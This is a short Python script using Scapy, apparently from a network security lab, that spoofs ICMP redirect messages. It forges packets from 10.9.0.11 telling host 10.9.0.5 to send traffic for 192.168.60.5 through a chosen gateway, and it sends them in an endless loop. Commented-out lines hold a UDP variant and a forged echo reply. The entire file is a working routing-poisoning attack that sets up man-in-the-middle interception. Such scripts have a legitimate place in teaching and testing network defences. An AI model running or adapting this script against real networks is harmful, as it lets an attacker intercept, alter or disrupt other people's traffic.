#!/usr/bin/python3

from scapy.all import *
ip = IP(src = "10.9.0.11", dst = "10.9.0.5")
icmp = ICMP(type=5, code=1)
icmp.gw = "10.9.0.111" # gateway
# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = "10.9.0.5", dst = "192.168.60.5")
while True:
    send(ip/icmp/ip2/ICMP())
# send(ip/icmp/ip2/UDP())

# send(IP(src="192.168.60.5", dst="10.9.0.5") / ICMP(type=0, code=0))